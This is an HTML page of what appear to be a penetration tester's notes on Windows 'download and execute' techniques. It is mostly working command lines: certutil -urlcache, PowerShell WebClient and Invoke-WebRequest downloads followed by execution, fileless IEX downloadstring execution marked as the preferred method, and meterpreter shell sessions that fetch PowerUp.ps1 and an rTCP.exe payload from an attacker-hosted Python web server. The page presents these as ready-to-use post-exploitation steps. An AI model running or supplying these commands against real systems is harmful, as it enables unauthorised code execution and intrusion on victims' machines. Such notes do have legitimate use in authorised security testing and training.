<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Download and execute file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Download and execute file</h1><br /><br /><br /><strong>
      <h3>Command Line</h3>
    </strong><br />
    <div class="codebox">
      <div class="codebox">certutil&nbsp;-urlcache&nbsp;-f&nbsp;http://&lt;kali&nbsp;ip&gt;/file.exe&nbsp;file.exe&nbsp;
      </div>
    </div><br /><br /><br /><strong>
      <h3>Powershell</h3>
    </strong><br />
    <div class="codebox">
      <div class="codebox">Get-Host</div>
    </div><br /><a href=""><img src="images/1074-1.png" alt="images/1074-1.png" /></a><a href=""><img
        src="images/1074-2.png" alt="images/1074-2.png" /></a><br />Powershell 1 → Server 2008<br />Powershell 2 →
    7/Server 2008 R2<br />Powershell 3 → 8/Server 2012<br />Powershell 4 → 8.1/Server 2012 R2<br />Powershell 5 →
    10<br /><br /><br />From Command line(cmd) start with “powershell -c ”<br /><br />There are two primary ways we can
    download and execute code using PowerShell:<br />• <strong>download to disk</strong><br /> ◇ Powershell
    2/3/4/5<br /> ▪ Net.WebClient DownloadFile method<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile(&quot;https://raw.githubusercontent.com/DenFox93/prova1/main/example.exe&quot;,&quot;$env:userprofile\desktop\file.exe&quot;)<br />PS&gt;&nbsp;&amp;&nbsp;&#39;$env:userprofile\desktop\fileprova.exe&#39;&nbsp;&nbsp;&nbsp;&nbsp;#execute&nbsp;the&nbsp;file
      </div>
    </div><br /> ▪ BITSAdmin.exe<br /> ▪ Certutil.exe w/ -urlcache argument<br /> ◇ Powershell 3/4/5<br /> <a
      href=""><img src="images/1074-3.png" alt="images/1074-3.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;Invoke-WebRequest&nbsp;-Uri&nbsp;&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.exe&#39;&nbsp;-Outfile&nbsp;&#39;$env:userprofile\desktop\fileprova.exe&#39;<br />PS&gt;&nbsp;&amp;&nbsp;&#39;$env:userprofile\desktop\fileprova.exe&#39;&nbsp;&nbsp;&nbsp;&nbsp;#execute&nbsp;the&nbsp;file
      </div>
    </div><br />• download and run within the <strong>PowerShell process memory</strong>, and never touches the disk
    (Preferred Method)<br /> ◇ Powershell 2/3/4/5<br /> In “example.txt” there is the command “ls” because of that, the
    machine where we execute the command will list files and directories in the current folder<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.txt&#39;);
      </div>
    </div><br /> <a href=""><img src="images/1074-4.png" alt="images/1074-4.png" /></a><br /> ◇ Powershell 3/4/5<br />
    In “example.txt” there is the command “ls” because of that, the machine where we execute the command will list files
    and directories in the current folder<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(Invoke-WebRequest&nbsp;-Uri&nbsp;&#39;https://raw.githubusercontent.com/DenFox93/prova1/main/example.txt&#39;).Content&nbsp;|&nbsp;Invoke-Expression
      </div>
    </div><br /> <a href=""><img src="images/1074-5.png"
        alt="images/1074-5.png" /></a><br /><br /><br /><br /><strong>Download from the web</strong><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;shell<br />C:\Users\danie\Desktop&gt;&nbsp;powershell&nbsp;-Command&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile<span
          style="color:#000000;font-weight:400">(</span>&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;,&#39;C:\Users\danie\Desktop\new\powerup1.ps1&#39;<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /><br /><br /><strong>Download file from our local server</strong><br />1. create local web server on
    linux<br /> ◇ with python2<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;cd&nbsp;/home/kali/Desktop/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#positioning&nbsp;in&nbsp;the&nbsp;directory&nbsp;to&nbsp;serve<br />root@kali:/#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#create&nbsp;we&nbsp;server
      </div>
    </div><br /> ◇ with python3<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;python3&nbsp;-m&nbsp;http.server&nbsp;80&nbsp;-d&nbsp;/home/kali/Desktop/
      </div>
    </div><br />2. Download file on Windows<br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;shell<br />C:\Users\danie\Desktop&gt;&nbsp;powershell&nbsp;-Command&nbsp;(New-Object&nbsp;System.Net.WebClient).downloadfile<span
          style="color:#000000;font-weight:400">(</span>&#39;http://172.16.5.50:8000/rTCP.exe&#39;,&#39;$env:userprofile\desktop\rTCP.exe&#39;<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /><br /><strong>Upload from via meterpreter</strong><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&gt;&nbsp;upload&nbsp;&quot;/home/kali/Desktop/file.txt&quot;&nbsp;&quot;C:\Users\danie\Desktop\new\file.txt&quot;
      </div>
    </div><br /> <br /><br /><br />
  </div>
</body>

</html>